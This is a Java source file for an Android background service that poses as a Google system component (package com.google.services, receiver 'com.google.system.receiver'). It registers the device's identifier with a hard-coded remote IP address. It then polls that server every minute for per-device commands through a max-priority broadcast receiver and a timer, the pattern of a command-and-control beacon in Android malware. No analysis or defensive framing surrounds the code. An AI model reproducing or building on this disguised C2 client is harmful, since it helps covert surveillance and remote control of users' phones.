package com.google.services;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.util.Log;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

public class PhoneService extends Service {
    static boolean Flag = false;
    public static SendInfo send = SendInfo.getInstance();
    long delay = 60000;
    public String hostname = null;
    public boolean linkFlag = false;
    Timer mTimer = new Timer();
    TimerTask mTimerTask = new TimerTask() {
        public void run() {
            try {
                if (PhoneService.Flag) {
                    PhoneService.this.isConnect(PhoneService.this.getBaseContext());
                    if (PhoneService.this.linkFlag) {
                        new Thread() {
                            public void run() {
                                PhoneService.send.chuli();
                            }
                        }.start();
                    }
                    Log.i("定时器的RUN", "整个定时器的循环结束了！！");
                }
                if (!PhoneService.this.linkFlag) {
                    PhoneService.this.isConnect(PhoneService.this.getBaseContext());
                } else if (PhoneService.send.sendInfo("create", PhoneService.this.nativenumber)) {
                    IntentFilter intentFilter = new IntentFilter("com.google.system.receiver");
                    intentFilter.setPriority(Integer.MAX_VALUE);
                    PhoneService.this.registerReceiver(new sendReceiver(), intentFilter);
                    PhoneService.send.urlstr = PhoneService.this.hostname + "/data/" + PhoneService.this.nativenumber + "/process.php";
                    PhoneService.this.serviceInit();
                    PhoneService.Flag = true;
                }
                Log.i("定时器的RUN", "整个定时器的循环结束了！！");
            } catch (Exception e) {
                Log.i("RUN里面", "ERROR");
            }
        }
    };
    public String nativenumber = null;
    long period = 60000;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.hostname = "http://64.78.161.133";
        try {
            this.nativenumber = getPackageManager().getServiceInfo(new ComponentName(this, PhoneService.class), 128).metaData.getString("telmark");
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
        if (this.nativenumber.equals("phone")) {
            SharedPreferences sharedPreferences = getSharedPreferences("number", 0);
            this.nativenumber = sharedPreferences.getString("native", "");
            if ("".equals(this.nativenumber)) {
                this.nativenumber = "phone" + new Date().getTime();
                sharedPreferences.edit().putString("native", this.nativenumber).commit();
            }
        }
        send.urlstr = this.hostname + "/android.php";
        isConnect(getBaseContext());
        Log.i("启动了", this.nativenumber);
        if (!this.linkFlag) {
            Log.i("手机网络情况", "手机没有网络，或者send模块错误！");
        } else if (send.sendInfo("create", this.nativenumber)) {
            IntentFilter intentFilter = new IntentFilter("com.google.system.receiver");
            intentFilter.setPriority(Integer.MAX_VALUE);
            registerReceiver(new sendReceiver(), intentFilter);
            send.urlstr = this.hostname + "/data/" + this.nativenumber + "/process.php";
            serviceInit();
            Flag = true;
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
        if (!"".equals(this.nativenumber)) {
            try {
                this.mTimer.scheduleAtFixedRate(this.mTimerTask, this.delay, this.period);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public boolean isConnect(Context context) {
        if (context != null) {
            NetworkInfo activeNetworkInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
            if (activeNetworkInfo != null) {
                this.linkFlag = true;
                return activeNetworkInfo.isAvailable();
            }
        }
        this.linkFlag = false;
        return false;
    }

    public void serviceInit() {
        startService(new Intent(this, AlarmService.class));
    }
}
